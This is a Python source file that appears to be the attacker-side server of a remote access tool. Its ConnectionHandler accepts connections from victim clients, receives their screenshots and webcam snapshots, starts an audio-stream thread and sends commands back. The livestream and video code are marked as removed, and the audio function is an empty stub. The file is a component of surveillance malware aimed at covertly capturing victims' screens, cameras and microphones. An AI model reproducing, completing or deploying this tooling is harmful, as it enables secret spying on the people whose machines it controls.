import asyncio
import os
import threading

from src.attacker.util import ts

CURRENT_FOLDER = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))

BUFFER_SNAPSHOT = 609600
BUFFER_DEFAULT = 8096
ENCODING = "utf-8"

WEBCAM_SCRIPT = "wb.py"
MICROPHONE_SCRIPT = "mic.py"

WEBCAM_DIR_FMT = "wb{client_id}"
SCREENSHOT_DIR_FMT = "ss{client_id}"

SNAPSHOT_NAME_FMT = "snap{num}.png"
SCREENSHOT_NAME_FMT = "ss_{client_id}_{num}.png"

DATA_TAKEN_SCREENSHOT = "TS"
DATA_TAKEN_SNAPSHOT = "SS"
# DATA_START_LIVESTREAM removed
DATA_START_AUDIOSTREAM = "VA"

CONNECTION_DISCONNECT_TEMPLATE = "[{time}] Client {addr} disconnected"
CONNECTION_LOST_TEMPLATE = "[{time}] Client {addr} lost connection"


class ConnectionHandler:
    receiving_screenshot = False
    receiving_snapshot = False

    def __init__(self, reader, writer, addr, window, iD, connections):
        self.reader = reader
        self.writer = writer
        self.window = window
        self.id = iD
        self.addr = addr
        self._connections = connections
        self._service_handlers = []
        self._encryption_handler = None
        self._running = True

    async def handle_client(self):
        """Main handler for client connection - reads data and processes it."""
        try:
            while self._running:
                try:
                    data_bytes = await asyncio.wait_for(
                        self.reader.read(BUFFER_DEFAULT), 
                        timeout=1.0
                    )
                    if not data_bytes:
                        # Connection closed by client
                        break
                    
                    data = data_bytes.decode(ENCODING)
                    
                    if data == DATA_TAKEN_SCREENSHOT:
                        ConnectionHandler.receiving_screenshot = True
                    elif data == DATA_TAKEN_SNAPSHOT:
                        ConnectionHandler.receiving_snapshot = True
                    # elif data == DATA_START_LIVESTREAM logic removed
                    elif data == DATA_START_AUDIOSTREAM:
                        audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
                        audio_thread.start()
                    elif data != "":
                        self.window.Output.addItem(f"{ts()} {data}")
                        
                except asyncio.TimeoutError:
                    # No data received, continue loop
                    continue
                except Exception as e:
                    # Connection error
                    self.window.Output.addItem(CONNECTION_LOST_TEMPLATE.format(time=ts(), addr=self.addr))
                    break
                    
        finally:
            await self.close()

    async def close(self):
        """Close the connection and clean up."""
        self._running = False
        try:
            if self.writer and not self.writer.is_closing():
                self.writer.close()
                await self.writer.wait_closed()
        except Exception:
            pass
        finally:
            self._connections.pop(self.id, None)
            self.window.Output.addItem(CONNECTION_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr))

    def send(self, data):
        """Send data to the client."""
        if self.writer and not self.writer.is_closing():
            try:
                if isinstance(data, str):
                    data = data.encode(ENCODING)
                self.writer.write(data)
            except Exception:
                pass

    # video_stream removed

    @staticmethod
    def audio_stream():
        return
